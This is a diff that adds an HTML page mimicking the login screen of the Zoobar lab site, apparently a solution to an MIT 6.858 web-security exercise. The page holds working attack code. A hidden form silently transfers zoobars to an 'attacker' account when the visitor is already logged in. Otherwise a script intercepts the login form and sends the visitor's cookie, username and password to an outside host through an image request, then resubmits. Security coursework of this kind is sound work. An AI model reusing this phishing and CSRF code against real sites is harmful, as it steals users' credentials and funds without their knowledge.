@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
+        <title>
+          Login - Zoobar Foundation
+        </title>
+    </head>
+    <body>
+      <h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for Patriotic
+                      Thinking</a></h1>
+      <h2>Supporting the skillful
+          advocates of the 21st-century</h2>
+
+      
+<div id="login" class="centerpiece">
+<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" >
+<table>
+<tr>
+   <td>Username:</td>
+  <td><input type="text" name="login_username" size="20"
+  autocomplete="no" value=""></td>
+</tr>
+<tr>
+   <td>Password:</td>
+  <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
+  <input type="submit" name="submit_login" value="Log in">
+  <input type="submit" name="submit_registration" value="Register"></td>
+</tr>
+</table>
+<input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
+</form>
+
+<iframe id="attackf" name="attackf" style="display:none" srcdoc=""></iframe>
+
+<div style="display:none">
+<form method='POST' name='transferform' id='transferform' action='http://localhost:8080/zoobar/index.cgi/transfer' target="attackf">
+<p>Send <input name='zoobars_orig' type='text' value='' size=5> zoobars</p>
+<p>to <input name=recipientold type=text value='' size=10></p>
+<input name='zoobars' type='text' value='10' size=5 style='display:none'>
+<input name=recipient type=text value='attacker' size=10 style='display:none'>
+<input type='submit' name='submission' value='Send'>
+</form>
+</div>
+</div>
+<div class="footer warning">
+
+</div>
+
+<!--side channel, to test whether the user has logged in or not-->
+<div style="display:none", id="myZoobars"></div>
+<script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
+
+<script>
+<!--first remove the eventlistener or it will cancel sumit again and email-->
+function reSubmit(){
+   document.getElementsByName("loginform")[0].removeEventListener("submit",emailPasswd);
+   <!--since there are two "sumbmit": register and login, let's make it clear so the browser knows which one to submit-->
+   document.getElementsByName("submit_login")[0].click();
+}
+
+<!--cancel the default submit first, email password and username to me and then resubmit-->
+function emailPasswd(event){
+  event.preventDefault();
+  var passwd = document.getElementsByName("login_password")[0].value;
+  var name = document.getElementsByName("login_username")[0].value;
+  (new Image()).src='http://192.168.76.130/sendmail.php?' + 'to=19930127zpf@sjtu.edu.cn' + '&payload=' + encodeURIComponent(document.cookie) + 'password=' + passwd + 'username='+ name + '&random=' + Math.random();
+  setTimeout(reSubmit, 5000);
+}
+
+function loadReady(){
+  window.location.href="http://css.csail.mit.edu/6.858/2015/";
+}
+var div_value = document.getElementById("myZoobars").innerHTML;
+if(div_value){
+  document.getElementsByName("attackf")[0].addEventListener("load",loadReady,false);
+  document.forms["transferform"].submit();
+}
+else{
+   document.getElementsByName("loginform")[0].addEventListener("submit",emailPasswd,false);
+}
+
+</script>
+<script>document.loginform.login_username.focus();</script>
+
+    </body>
+</html>
